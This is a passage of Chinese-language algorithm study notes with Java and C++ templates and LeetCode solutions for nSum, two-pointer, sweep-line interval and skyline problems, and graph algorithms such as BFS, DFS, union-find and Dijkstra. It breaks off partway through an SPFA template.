*/\nvector<vector<int>> nSumTarget(\n    vector<int>& nums, int n, int start, int target) {\n\n    int sz = nums.size();\n    vector<vector<int>> res;\n    // 至少是 2Sum，且数组大小不应该小于 n\n    if (n < 2 || sz < n) return res;\n    // 2Sum 是 base case\n    if (n == 2) {\n        // 双指针那一套操作\n        int lo = start, hi = sz - 1;\n        while (lo < hi) {\n            int sum = nums[lo] + nums[hi];\n            int left = nums[lo], right = nums[hi];\n            if (sum < target) {\n                while (lo < hi && nums[lo] == left) lo++;\n            } else if (sum > target) {\n                while (lo < hi && nums[hi] == right) hi--;\n            } else {\n                res.push_back({left, right});\n                while (lo < hi && nums[lo] == left) lo++;\n                while (lo < hi && nums[hi] == right) hi--;\n            }\n        }\n    } else {\n        // n > 2 时，递归计算 (n-1)Sum 的结果\n        for (int i = start; i < sz; i++) {\n            vector<vector<int>> \n                sub = nSumTarget(nums, n - 1, i + 1, target - nums[i]);\n            for (vector<int>& arr : sub) {\n                // (n-1)Sum 加上 nums[i] 就是 nSum\n                arr.push_back(nums[i]);\n                res.push_back(arr);\n            }\n            while (i < sz - 1 && nums[i] == nums[i + 1]) i++;\n        }\n    }\n    return res;\n}\n```\n嗯，看起来很长，实际上就是把之前的题目解法合并起来了，n == 2 时是 twoSum 的双指针解法，n > 2 时就是穷举第一个数字，然后递归调用计算 (n-1)Sum，组装答案。\n\n需要注意的是，调用这个 nSum 函数之前一定要先给 nums 数组排序，因为 nSum 是一个递归函数，如果在 nSum 函数里调用排序函数，那么每次递归都会进行没有必要的排序，效率会非常低。\n\n比如说现在我们写 LeetCode 上的 4Sum 问题：\n```cpp\nvector<vector<int>> fourSum(vector<int>& nums, int target) {\n    sort(nums.begin(), nums.end());\n    // n 为 4，从 nums[0] 开始计算和为 target 的四元组\n    return nSumTarget(nums, 4, 0, target);\n}\n```\n再比如 LeetCode 的 3Sum 问题，找 target == 0 的三元组：\n```cpp\nvector<vector<int>> threeSum(vector<int>& nums) {\n    sort(nums.begin(), nums.end());\n    // n 为 3，从 nums[0] 开始计算和为 0 的三元组\n    return nSumTarget(nums, 3, 0, 0);        \n}\n```\n那么，如果让你计算 100Sum 问题，直接调用这个函数就完事儿了。\n\n#### NSum模版\n```java\n/**\n *\n * @param nums 由小到大排序好的数组\n * @param n n数之和\n * @param start 开始坐标\n * @param target 目标和\n */\nList<List<Integer>> nSumTarget(int[] nums, int n, int start, long target) {\n  int N = nums.length;\n  List<List<Integer>> res = new ArrayList();\n  // 至少是 2Sum，且数组大小不应该小于 n\n  if (n < 2 || N < n) return res;\n  if (n == 2) {\n    int left = start, right = N - 1;\n    while (left < right) {\n      long sum = (long) nums[left] + nums[right];\n      if (sum > target) {\n        right--;\n      } else if (sum < target) {\n        left++;\n      } else {\n        List<Integer> temp = new ArrayList();\n        temp.add(nums[left]);\n        temp.add(nums[right]);\n        res.add(temp);\n        left++;\n        right--;\n        while (left < right && nums[left] == nums[left - 1]) left++;\n        while (left < right && nums[right] == nums[right + 1]) right--;\n      }\n    }\n  } else {\n    // n > 2 时，递归计算 (n-1)Sum 的结果\n    for (int i = start; i < N; i++) {\n      List<List<Integer>> sub = nSumTarget(nums, n - 1, i + 1, target - nums[i]);\n      for (List<Integer> item : sub) {\n        item.add(nums[i]);\n        res.add(item);\n      }\n      while (i + 1 < N && nums[i + 1] == nums[i]) i++;\n    }\n  }\n  return res;\n}\n```\n\n#### 例题1: 两数之和 II - 输入有序数组\n[两数之和 II - 输入有序数组](https://leetcode.cn/problems/two-sum-ii-input-array-is-sorted/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721104439.png)\n\n代码：\n```java\nclass Solution {\n  public int[] twoSum(int[] numbers, int target) {\n    Arrays.sort(numbers);\n    int n = numbers.length;\n    int left = 0, right = n - 1;\n    while (left < right) {\n      int sum = numbers[left] + numbers[right];\n      if (sum < target) {\n        left++;\n      } else if (sum > target) {\n        right--;\n      } else {\n        return new int[]{left + 1, right + 1};\n      }\n    }\n    return null;\n  }\n}\n```\n\n#### 例题2: 三数之和\n[三数之和](https://leetcode.cn/problems/3sum/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721104541.png)\n\n代码：\n```java\nclass Solution {\n  public List<List<Integer>> threeSum(int[] nums) {\n    Arrays.sort(nums);\n    List<List<Integer>> res = new ArrayList();\n    for (int i = 0; i < nums.length - 2; i++) {\n      List<int[]> temp = twoSum(nums, i + 1, -nums[i]);\n      for (int[] item : temp) {\n        List<Integer> subRes = new ArrayList(); \n        subRes.add(nums[i]);\n        subRes.add(item[0]);\n        subRes.add(item[1]);\n        res.add(subRes);\n      }\n      while (i + 1 < nums.length && nums[i + 1] == nums[i]) i++;\n    }\n    return res;\n  }\n  \n  List<int[]> twoSum(int[] nums, int start, int target) {\n    List<int[]> res = new ArrayList();\n    int n = nums.length;\n    int left = start, right = n - 1;\n    while (left < right) {\n      int sum = nums[left] + nums[right];\n      if (sum > target) {\n        right--;\n      } else if (sum < target) {\n        left++;\n      } else {\n        res.add(new int[]{nums[left], nums[right]});\n        left++;\n        right--;\n        while (left < right && nums[left] == nums[left - 1]) left++;\n        while (left < right && nums[right] == nums[right + 1]) right--;\n      }\n    }\n    return res;\n  } \n\n}\n```\n\n#### 例题3: 四数之和\n[四数之和](https://leetcode.cn/problems/4sum/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721104647.png)\n\n代码：\n```java\nclass Solution {\n  public List<List<Integer>> fourSum(int[] nums, int target) {\n    Arrays.sort(nums);\n    return nSumTarget(nums, 4, 0, target);\n  }\n\n  List<List<Integer>> nSumTarget(int[] nums, int n, int start, long target) {\n    int N = nums.length;\n    List<List<Integer>> res = new ArrayList();\n    // 至少是 2Sum，且数组大小不应该小于 n\n    if (n < 2 || N < n) return res;\n    if (n == 2) {\n      int left = start, right = N - 1;\n      while (left < right) {\n        long sum = (long)nums[left] + nums[right];\n        if (sum > target) {\n          right--;\n        } else if (sum < target) {\n          left++;\n        } else {\n          List<Integer> temp = new ArrayList();\n          temp.add(nums[left]);\n          temp.add(nums[right]);\n          res.add(temp);\n          left++;\n          right--;\n          while (left < right && nums[left] == nums[left - 1]) left++;\n          while (left < right && nums[right] == nums[right + 1]) right--;\n        } \n      }\n    } else {\n      // n > 2 时，递归计算 (n-1)Sum 的结果\n      for (int i = start; i < N; i++) {\n        List<List<Integer>> sub = nSumTarget(nums, n - 1, i + 1, target - nums[i]);\n        for (List<Integer> item : sub) {\n          item.add(nums[i]);\n          res.add(item);\n        }\n        while (i + 1 < N && nums[i + 1] == nums[i]) i++;\n      }\n    }\n    return res;\n  }\n}\n```\n\n### 其他问题\n#### 例题1: 反转数组\n[反转数组](https://leetcode.cn/problems/reverse-string/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721105740.png)\n\n代码：\n```java\nclass Solution {\n  public void reverseString(char[] s) {\n    int left = 0, right = s.length - 1;\n    while (left < right) {\n      char temp = s[left];\n      s[left] = s[right];\n      s[right] = temp;\n      left++;\n      right--;\n    }\n  }\n}\n```\n\n#### 例题2: 验证回文串\n[验证回文串](https://leetcode.cn/problems/valid-palindrome/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721111436.png)\n\n代码：\n```java\nclass Solution {\n  public boolean isPalindrome(String s) {\n    s = s.toLowerCase();\n    char[] sCh = s.toCharArray();\n    int left = 0, right = sCh.length - 1;\n    while (left < right) {\n      if (!((sCh[left] <= 'z' && sCh[left] >= 'a' )|| (sCh[left] <= '9' && sCh[left] >= '0'))){\n        left++;\n        continue;\n      }\n      if (!((sCh[right] <= 'z' && sCh[right] >= 'a' )|| (sCh[right] <= '9' && sCh[right] >= '0'))){\n        right--;\n        continue;\n      }\n      if (sCh[left] != sCh[right]) {\n        return false;\n      }\n      left++;\n      right--;\n    }\n    return true;\n  }\n}\n```\n\n# 几何\n## 扫描线算法\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/NoPTAgfyCc8\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n- 通用的思路: 假设一个平面上有n个几何对象，想像一条扫描线从左到右或者从上到下扫过它们。 \n- 发生的事件：扫描线进入和离开一个几何对象。对于平行于坐标轴的矩形来说，可以理解为扫描线进入和离开一个线段。\n- 对于事件的处理：用一个数据结构维护扫描线与几何对象们的交集。对于平行于坐标轴的矩形来说，可以使用线段树。\n\n给事件排序时，需要考虑以下4件特殊情况:\n1. 2个事件的开始位置相同\n1. 2个事件的结束位置相同\n2. 1个事件的结束位置与另一个事件的开始位置相同\n3. 2个事件的开始以及结束位置都相同\n\n### 模版\n```java\npublic List<List<Integer>> funExample(int[][] buildings) {\n  List<List<Integer>> res = new ArrayList();\n  \n  // 添加事件\n  List<Event> events = new ArrayList(); \n  for (int i = 0; i < buildings.length; i++) {\n    int[] build = buildings[i];\n    events.add(new Event(i, build[0], 1, build[2]));\n    events.add(new Event(i, build[1], -1, build[2]));\n  }\n  // 给事件排序\n  events.sort((a, b) -> {\n    if (a.pos == b.pos) {\n      // 考虑4中特殊情况\n    }\n    return a.pos - b.pos;\n  });\n\n  // 维护扫描线与几何对象们的交集\n  PriorityQueue<Event> pq = new PriorityQueue<Event>((a, b) -> {\n    return b.height - a.height;\n  });\n\n  // 遍历事件\n  for (Event event : events) {\n    if (event.type == 1) { // 如果是进入事件\n      ... \n      pq.add(event);\n    } else if (event.type == -1) { // 如果是离开事件\n      pq.remove(event);\n      ...\n    }\n  }\n  return res;\n}\n\nclass Event {\n  // 该事件的id\n  int id;\n  // 该事件位置\n  int pos;\n  int height;\n  // 表示当前事件的类型，如果为1表示为进入事件；为2表示离开事件\n  int type;\n\n  public Event(int id, int pos, int type, int height) {\n    this.id = id;\n    this.pos = pos;\n    this.type = type;\n    this.height = height;\n  }\n\n  public boolean equals(Object o) {\n    Event e = (Event) o;\n    return e.id == id;\n  }\n\n  public int hashCode() {\n    return Objects.hash(id);\n  }\n}\n```\n\n### 例题1: 天际线问题\n[天际线问题](https://leetcode.cn/problems/the-skyline-problem/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220724170751.png)\n\n#### 分析\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/ZbpfMkA_NfE\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\nclass Solution {\n  public List<List<Integer>> getSkyline(int[][] buildings) {\n    List<List<Integer>> res = new ArrayList();\n    List<Event> events = new ArrayList(); \n    for (int i = 0; i < buildings.length; i++) {\n      int[] build = buildings[i];\n      events.add(new Event(i, build[0], 1, build[2]));\n      events.add(new Event(i, build[1], -1, build[2]));\n    }\n    events.sort((a, b) -> {\n      if (a.pos == b.pos) {\n        return b.type * b.height - a.type * a.height;\n      }\n      return a.pos - b.pos;\n    });\n\n    PriorityQueue<Event> pq = new PriorityQueue<Event>((a, b) -> {\n      return b.height - a.height;\n    });\n\n    for (Event event : events) {\n      List<Integer> temp = new ArrayList();\n      if (event.type == 1) { // 如果是进入事件\n        if (pq.isEmpty() || event.height > pq.peek().height) {\n          temp.add(event.pos);\n          temp.add(event.height);\n          res.add(temp);\n        }\n        pq.add(event);\n      } else if (event.type == -1) { // 如果是离开事件\n        pq.remove(event);\n        if (pq.isEmpty() || event.height > pq.peek().height) {\n          temp.add(event.pos);\n          temp.add(pq.isEmpty() ? 0 : pq.peek().height);\n          res.add(temp);\n        }\n      }\n    }\n    return res;\n  }\n}\n\nclass Event {\n  int id;\n  int pos;\n  int height;\n  int type;\n\n  public Event(int id, int pos, int type, int height) {\n    this.id = id;\n    this.pos = pos;\n    this.type = type;\n    this.height = height;\n  }\n\n  public boolean equals(Object o) {\n    Event e = (Event) o;\n    return e.id == id;\n  }\n\n  public int hashCode() {\n    return Objects.hash(id);\n  }\n\n}\n```\n\n### 例题2: 合并区间\n[合并区间](https://leetcode.cn/problems/merge-intervals/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220724171447.png)\n\n代码：\n```java\nclass Solution {\n  public int[][] merge(int[][] intervals) {\n    List<int[]> res = new ArrayList();\n    List<Event> events = new ArrayList();\n    for (int i = 0; i < intervals.length; i++) {\n      int[] interval = intervals[i];\n      events.add(new Event(i, interval[0], 1)); \n      events.add(new Event(i, interval[1], -1)); \n    }\n\n    events.sort((a, b) -> {\n      if (a.pos == b.pos) {\n        return b.type - a.type;\n      }\n      return a.pos - b.pos;\n    });\n\n    List<Event> list = new ArrayList();\n    int[] temp = new int[2];\n    for (Event event : events) {\n      if (event.type == 1) {\n        if (list.isEmpty()) {\n          temp[0] = event.pos;\n        }\n        list.add(event);\n      } else if (event.type == -1) {\n        list.remove(event);\n        if (list.isEmpty()) {\n          temp[1] = event.pos;\n          res.add(temp.clone());\n        }\n      }\n    }\n    return res.toArray(new int[0][0]);\n  }\n}\n\nclass Event {\n  int id;\n  int pos;\n  int type;\n\n  public Event(int id, int pos, int type) {\n    this.id = id;\n    this.pos = pos;\n    this.type = type;\n  }\n\n  public int hashCode() {\n    return Objects.hash(id);\n  }\n\n  public boolean equals(Object o) {\n    Event e = (Event) o;\n    return e.id == id;\n  }\n\n}\n```\n\n### 例题3: 插入区间\n[插入区间](https://leetcode.cn/problems/insert-interval/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220724171554.png)\n\n代码：\n```java\nclass Solution {\n  public int[][] insert(int[][] intervals, int[] newInterval) {\n    List<int[]> res = new ArrayList();\n    List<Event> events = new ArrayList();\n    for (int i = 0; i < intervals.length; i++) {\n      int[] interval = intervals[i];\n      events.add(new Event(i, interval[0], 1));\n      events.add(new Event(i, interval[1], -1));\n    }\n    events.add(new Event(intervals.length, newInterval[0], 1));\n    events.add(new Event(intervals.length, newInterval[1], -1));\n\n    events.sort((a, b) -> {\n      if (a.pos == b.pos) {\n        return b.type - a.type;\n      }\n      return a.pos - b.pos;\n    });\n\n    int[] temp = new int[2];\n    List<Event> list = new ArrayList();\n    for (Event event : events) {\n      if (event.type == 1) {\n        if (list.isEmpty()) {\n          temp[0] = event.pos;\n        }\n        list.add(event);\n      } else if (event.type == -1) {\n        list.remove(event);\n        if (list.isEmpty()) {\n          temp[1] = event.pos;\n          res.add(temp.clone());\n        }\n      }\n    }\n    return res.toArray(new int[0][0]);\n  }\n}\n\nclass Event {\n  int id;\n  int pos;\n  int type;\n  \n  public Event(int id, int pos, int type) {\n    this.id = id;\n    this.pos = pos;\n    this.type = type;\n  }\n\n  public int hashCode() {\n    return Objects.hash(id);\n  }\n\n  public boolean equals(Object o) {\n    Event e = (Event) o;\n    return e.id == id;\n  }\n}\n```\n\n### 例题4: 无重叠区间\n[无重叠区间](https://leetcode.cn/problems/non-overlapping-intervals/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220724171653.png)\n\n代码：\n```java\nclass Solution {\n  public int eraseOverlapIntervals(int[][] intervals) {\n    int res = 0;\n    List<Event> events = new ArrayList();\n    for (int i = 0; i < intervals.length; i++) { \n      int[] interval = intervals[i];\n      events.add(new Event(i, interval[0], 1)); \n      events.add(new Event(i, interval[1], -1)); \n    }\n\n    events.sort((a, b) -> {\n      if (a.pos == b.pos) {\n        return a.type - b.type;\n      }\n      return a.pos - b.pos;\n    });\n    \n    Set<Integer> removed = new HashSet();\n    List<Event> list = new ArrayList();\n    for (Event event : events) {\n      if (event.type == 1) {\n        list.add(event);\n      } else if (event.type == -1 && !removed.contains(event.id)) {\n        for (Event item : list) {\n          removed.add(item.id);\n        }\n        res += list.size() - 1;\n        list.clear();\n      }\n    }\n    return res;\n\n  }\n\n}\n\nclass Event {\n  int id;\n  int pos;\n  int type;\n\n  public Event(int id, int pos, int type) {\n    this.id = id;\n    this.pos = pos;\n    this.type = type;\n  }\n\n  public int hashCode() {\n    return Objects.hash(id);\n  }\n\n  public boolean equlas(Object o) {\n    Event e = (Event) o;\n    return e.id == id;\n  }\n\n}\n```\n\n### 例题5: 删除被覆盖区间\n[删除被覆盖区间](https://leetcode.cn/problems/remove-covered-intervals/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220724171753.png)\n\n代码：\n```java\nclass Solution {\n  public int removeCoveredIntervals(int[][] intervals) {\n    int res = 0;\n    List<Event> events = new ArrayList();\n    for (int i = 0; i < intervals.length; i++) {\n      int[] interval = intervals[i];\n      events.add(new Event(i, interval[0], 1, interval[1]));\n      events.add(new Event(i, interval[1], -1, interval[1]));\n    }\n    events.sort((a, b) -> {\n      if (a.pos == b.pos) {\n        return b.end - a.end;\n      }\n      return a.pos - b.pos;\n    });\n\n    PriorityQueue<Event> pq = new PriorityQueue<Event>((a, b) -> {\n      return b.end - a.end;\n    });\n\n    for (Event event : events) {\n      if (event.type == 1) {\n        if (!pq.isEmpty() && event.end <= pq.peek().end) {\n          res++;\n        }\n        pq.add(event);\n      } else if (event.type == -1) {\n        pq.remove(event);\n      }\n    } \n    return intervals.length - res;\n\n  }\n}\n\nclass Event {\n  int id;\n  int pos;\n  int type;\n  // 区间的结束位置\n  int end;\n\n  public Event(int id, int pos, int type, int end) {\n    this.id = id;\n    this.pos = pos;\n    this.type = type;\n    this.end = end;\n  }\n\n  public int hashCode() {\n    return Objects.hash(id);\n  }\n\n  public boolean equals(Object o) {\n    Event e = (Event) o;\n    return e.id == id;\n  } \n\n}\n```\n\n# 算法模版总结\n## 图论\n### BFS\n```java\n/**\n* visited: 用来存储被访问过的状态。如果允许状态是能够重复访问，则不需要创建visited变量\n* path: 用来存储路径。如果不需要输出路径，则不需要创建path变量\n* return: 是否可以到达目标状态\n**/\nboolean bfs(State startState) {\n  Queue<State> queue = new LinkedList();\n  Map<State, Boolean> visited = new HashMap();\n  Map<State, State> path = new HashMap();\n  \n  queue.add(startState);\n  visited.put(startState, true);\n\n  while (!queue.isEmpty()) {\n    State currentState = queue.poll();\n    // 如果currentState是目标状态\n    if (isObjective(currentState)) {\n      // 可以在这里输出path\n      return visited.get(currentState);\n    }\n\n    // 获取当前状态可以转换到的所有下一个状态。此时不需要考虑这个状态是否能被添加到队列中\n    List<State> nextStates = transition(currentState);\n\n    for (State nextState : nextStates) {\n      if (visited.containsKey(nextState)) continue;\n      queue.add(nextState);\n      visited.put(nextState, true);\n      path.put(nextState, currentState); \n    }\n  }\n  return false;\n}\n```\n\n### DFS\n```java\n/**\n * visited: 用来存储被访问过的状态。如果允许状态是能够重复访问，则不需要创建visited变量\n * path: 用来存储路径。如果不需要输出路径，则不需要创建path变量\n * return: 是否可以到达目标状态\n */\nboolean dfs(State currentState, Map<State, Boolean> visited, LinkedList<State> path) {\n\tvisited.put(currentState, true);\n\n\t// 如果currentState是目标状态\n\tif (isObjective(currentState)) {\n\t\t// 可以在这里输出path\n\t\treturn true;\n\t}\n\n  // 获取当前状态可以转换到的所有下一个状态。此时不需要考虑这个状态是否能被添加到队列中\n\tList<State> nextStates = transition(currentState);\n\n\tfor (State nextState : nextStates) {\n\t\tif (visited.containsKey(nextState)) continue;\n\t\tpath.push(nextState);\n\t\tif (dfs(nextState, visited, path)){\n\t\t\treturn true;\n\t\t}\n\t\tpath.pop();\n\t}\n\treturn false;\n}\n```\n\n### 查找连通分量-BFS\n```java\nint findComponents() {\n  // key表示节点/状态，value表示该节点/状态所属于的连通分支。\n  // 该components可以作为visited使用, 即当componets.containsKey(i) == false时，表示i节点没有被访问，反之，则被访问了\n  Map<State, Integer> components = new HashMap<>();\n\n  // 现在所求的连通分支标识\n  int currentComponent = 0;\n\n  // 遍历每个节点/状态\n  for (State state : States) {\n    if (!components.containsKey(state)) {\n      bfs(state, components, currentComponent++);\n    }\n  }\n  return currentComponent;\n}\n\nvoid bfs(State startState, Map<State, Integer> components, Integer currentComponent) {\n  Queue<State> queue = new LinkedList();\n\n  queue.add(startState);\n  components.put(startState, currentComponent);\n\n  while (!queue.isEmpty()) {\n    State currentState = queue.poll();\n\n    // 获取当前状态可以转换到的所有下一个状态。此时不需要考虑这个状态是否能被添加到队列中\n    List<State> nextStates = transition(currentState);\n\n    for (State nextState : nextStates) {\n      if (components.containsKey(nextState)) continue;\n      queue.add(nextState);\n      components.put(nextState, currentComponent);\n    }\n  }\n}\n\nclass State {\n\n}\n```\n\n### 查找连通分量-DFS\n```java\nint findComponents() {\n  // key表示节点/状态，value表示该节点/状态所属于的连通分支。\n  // 该components可以作为visited使用, 即当componets.containsKey(i) == false时，表示i节点没有被访问，反之，则被访问了\n  Map<State, Integer> components = new HashMap<>();\n\n  // 现在所求的连通分支标识\n  int currentComponent = 0;\n\n  // 遍历每个节点/状态\n  for (State state : States) {\n    if (!components.containsKey(state)) {\n      bfs(state, components, currentComponent++);\n    }\n  }\n  return currentComponent;\n}\n\nvoid dfs(State startState, Map<State, Integer> components, Integer currentComponent) {\n  components.put(startState, currentComponent);\n\n  // 获取当前状态可以转换到的所有下一个状态。此时不需要考虑这个状态是否能被添加到队列中\n  List<State> nextStates = transition(currentState);\n\n  for (State nextState : nextStates) {\n    if (components.containsKey(nextState)) continue;\n    dfs(nextState, components, currentComponent);\n  }\n}\n\nclass State {\n\n}\n```\n\n### 并查集\n#### 没有权值的并查集\n```java\nclass DisjointSet {\n  int[] parent;\n  // 连通分量的个数\n  int cnt;\n\n  public DisjointSet(int n) {\n    cnt = n;\n    // 初始化parent\n    parent = new int[n];\n    for (int i = 0; i < n; i++) {\n      parent[i] = i;\n    }\n  }\n\n  // 查找x属于哪个连通分支\n  int findParent(int x) {\n    if (x == parent[x]) {\n      return x; \n    } \n    parent[x] = findParent(parent[x]);\n    return parent[x];\n  }\n\n  // 合并2个连通分支\n  void unionSets(int a, int b) {\n    a = findParent(a);\n    b = findParent(b);\n    if (a != b) {\n      parent[a] = b;\n      cnt--;\n    }\n  }\n}\n```\n\n#### 有权值的并查集\n```java\nclass DisjointSet {\n  int[] parent;\n  // weight[x]表示节点x指向父节点的权值\n  double[] weight;\n  // 连通分量的个数\n  int cnt;\n\n  public DisjointSet(int n) {\n    cnt = n;\n    parent = new int[n];\n    weight = new double[n];\n    for (int i = 0; i < n; i++) {\n      parent[i] = i;\n      // 权值初始化, 如何初始化，根据情况而定\n      weight[i] = 1;\n    }\n  }\n\n  int findParent(int x) {\n    if (x == parent[x]) {\n      return x;\n    } \n    // 保存节点x没有进行路径压缩时的父节点。这样做是为了方便后续获取父节点的weight来更新节点x的weight\n    int origin = parent[x];\n    parent[x] = findParent(parent[x]);\n    // 更新weight[x], 具体如何更新，根据情况而定\n    weight[x] *= weight[origin];\n    return parent[x];\n  }\n\n  void unionSets(int a, int b, double value) {\n    int rootA = findParent(a);\n    int rootB = findParent(b);\n    \n    if (rootA != rootB) {\n      parent[rootA] = rootB;\n      // 更新weight[rootA], 具体如何更新，根据情况而定\n      weight[rootA] = value * weight[b] / weight[a];\n      cnt--;\n    }\n  }\n}\n```\n\n#### 需要记录每个连通分量中节点个数\n```java\nclass DisjointSet {\n  int[] parent;\n  // 记录每个连通分量中的节点个数\n  int[] size;\n  // 连通分量的个数\n  int cnt;\n\n  public DisjointSet(int n) {\n    cnt = n;\n    // 初始化parent\n    parent = new int[n];\n    size = new int[n];\n    for (int i = 0; i < n; i++) {\n      parent[i] = i;\n      size[i] = 1;\n    }\n  }\n\n  // 查找x属于哪个连通分支\n  int findParent(int x) {\n    if (x == parent[x]) {\n      return x;\n    }\n    parent[x] = findParent(parent[x]);\n    return parent[x];\n  }\n\n  // 合并2个连通分支\n  void unionSets(int a, int b) {\n    a = findParent(a);\n    b = findParent(b);\n    if (a != b) {\n      parent[a] = b;\n      size[b] += size[a];\n      cnt--;\n    }\n  }\n\n  // 返回x节点所在连通分量的大小\n  int getSize(int x) {\n    return size[findParent(x)];\n  }\n}\n```\n\n\n#### 初始化时节点总数不确定的并查集\n```java\nclass DisjointSet {\n  // key：节点编号；value：该节点的父节点\n  Map<Integer, Integer> parent;\n  // 连通分量的个数\n  int cnt;\n  \n  public DisjointSet() {\n    parent = new HashMap();\n    // 刚初始化话时，parent中节点个数为0，所以连通分量个数为0\n    cnt = 0;\n  }\n\n  int findParent(int x) {\n    // 如果parent没有统计当前节点x, 则将节点x添加到parent中，节点x的父节点为它自己。此时连通分量个数加1\n    if (!parent.containsKey(x)) {\n      parent.put(x, x);\n      cnt++;\n    }\n\n    if (x == parent.get(x)) {\n      return x;\n    }\n    parent.put(x, findParent(parent.get(x)));\n    return parent.get(x);\n  }\n\n  void unionSets(int a, int b) {\n    a = findParent(a);\n    b = findParent(b);\n    if (a != b) {\n      parent.put(a, b);\n      // 连通分量个数减1\n      cnt--;\n    }\n  }\n}\n```\n\n### 最短路径算法\n#### Dijkstra算法\n##### 模版1: 需求到达其他所有点的最短路径\n```java\n/**\n* startState: 开始状态\n* graph: 图的表示方式，这里是使用的带有的权值的邻接表的表示方式\n*/\nint[] dijkstra(State startState,  List<int[]>[] graph) {\n  // 优先队列，distFromStart较小的排在前面\n  Queue<State> pq = new PriorityQueue<>((a, b) -> {\n    return a.distFromStart - b.distFromStart;\n  });\n\n  // 初始化dist\n  // dist[i] 的值就是节点 start 到达节点 i 的最短路径权重\n  int[] dist = new int[graph.length];\n  // 起始点到各点的最短路径长度为Integer.MAX_VALUE\n  Arrays.fill(dist, Integer.MAX_VALUE);\n  // 节点start 到节点start的最短路径为0 \n  dist[startState.id] = 0;\n\n  // 用来标记节点是否已经被选择\n  boolean[] isSelected = new boolean[graph.length];\n\n  // 从起点start开始进bfs\n  pq.add(startState);\n\n  while (!pq.isEmpty()) {\n    State currentState = pq.poll();\n    \n    if (isSelected[currentState.id]) {\n      continue;\n    }\n    isSelected[currentState.id] = true;\n\n    // 获取currentState相邻节点\n    List<State> nextStates = new ArrayList();\n    for (int[] neighbor : graph[currentState.id]) {\n      int nextNodeID = neighbor[0];\n      int distToNextNode = dist[currentState.id] + neighbor[1];\n      nextStates.add(new State(nextNodeID, distToNextNode));\n    }\n     \n    for (State nextState : nextStates) {\n      if (isSelected[nextState.id]) continue;\n      if (dist[nextState.id] > nextState.distFromStart) {\n        dist[nextState.id] = nextState.distFromStart;\n        pq.add(nextState);\n      }\n    }\n  }\n  \n  return dist;\n}\n\n// 辅助类, 用于优先队列\nclass State {\n    // 图节点的 id\n    int id;\n    // 从 start 节点到当前节点的距离\n    int distFromStart;\n\n    State(int id, int distFromStart) {\n        this.id = id;\n        this.distFromStart = distFromStart;\n    }\n}\n```\n\n##### 模版2: 只需求到达某个点的最短路径\n```java\n/**\n* startState: 开始状态\n* graph: 图的表示方式，这里是使用的带有的权值的邻接表的表示方式\n* end: 目标点\n*/\nint dijkstra(State startState,  List<int[]>[] graph, int end) {\n  // 优先队列，distFromStart较小的排在前面\n  Queue<State> pq = new PriorityQueue<>((a, b) -> {\n    return a.distFromStart - b.distFromStart;\n  });\n\n  // 初始化dist\n  // dist[i] 的值就是节点 start 到达节点 i 的最短路径权重\n  int[] dist = new int[graph.length];\n  // 起始点到各点的最短路径长度为Integer.MAX_VALUE\n  Arrays.fill(dist, Integer.MAX_VALUE);\n  // 节点start 到节点start的最短路径为0 \n  dist[startState.id] = 0;\n\n  // 用来标记节点是否已经被选择\n  boolean[] isSelected = new boolean[graph.length];\n\n  // 从起点start开始进bfs\n  pq.add(startState);\n\n  while (!pq.isEmpty()) {\n    State currentState = pq.poll();\n    \n    // 如果currentState是目标点\n    if (currentState.id == end) {\n      return currentState.distFromStart;\n    }\n\n    if (isSelected[currentState.id]) {\n      continue;\n    }\n    isSelected[currentState.id] = true;\n\n\n    // 获取currentState相邻节点\n    List<State> nextStates = new ArrayList();\n    for (int[] neighbor : graph[currentState.id]) {\n      int nextNodeID = neighbor[0];\n      int distToNextNode = dist[currentState.id] + neighbor[1];\n      nextStates.add(new State(nextNodeID, distToNextNode));\n    }\n     \n    for (State nextState : nextStates) {\n      if (isSelected[nextState.id]) continue;\n      if (dist[nextState.id] > nextState.distFromStart) {\n        dist[nextState.id] = nextState.distFromStart;\n        pq.add(nextState);\n      }\n    }\n  }\n\n  // 如果到达这里，说明从 start 开始无法到达 end，返回 -1\n  return -1;\n}\n\n// 辅助类, 用于优先队列\nclass State {\n    // 图节点的 id\n    int id;\n    // 从 start 节点到当前节点的距离\n    int distFromStart;\n\n    State(int id, int distFromStart) {\n        this.id = id;\n        this.distFromStart = distFromStart;\n    }\n}\n```\n\n#### Bellman-Ford算法\n```java\n/**\n  * @param s     起点\n  * @param k     得到使用小于等于k条边的最短路径\n  * @param edges 边集数组存储的图\n  * @param n     顶点个数\n  * @return\n  */\nint[] bellmanFord(int s, int k, List<Edge> edges, int n) {\n  int[] dist = new int[n];\n  Arrays.fill(dist, 0x3f3f3f3f);\n  dist[s] = 0;\n  // 执行k次\n  for (int i = 0; i < k; i++) {\n    int[] distClone = dist.clone();\n    boolean flag = false;\n    for (Edge edge : edges) {\n      if (dist[edge.end] > distClone[edge.begin] + edge.weight) {\n        dist[edge.end] = distClone[edge.begin] + edge.weight;\n        flag = true;\n      }\n    }\n    if (!flag) {\n      return dist;\n    }\n  }\n  return dist;\n}\n\n/**\n  * 使用边集数组存储图\n  */\nclass Edge {\n  int begin, end, weight;\n\n  Edge(int begin, int end, int weight) {\n    this.begin = begin;\n    this.end = end;\n    this.weight = weight;\n  }\n}\n```\n\n#### SPFA算法\n```java\n/**\n * @param startState 起点状态\n * @param n          节点个数\n * @param dist       用于得到起点到其它顶点之间的最短距离\n * @param graph      图\n * @return 是否存在负环，返回true，则存在负环\n */\nboolean spfa(State startState, int n, int[] dist, 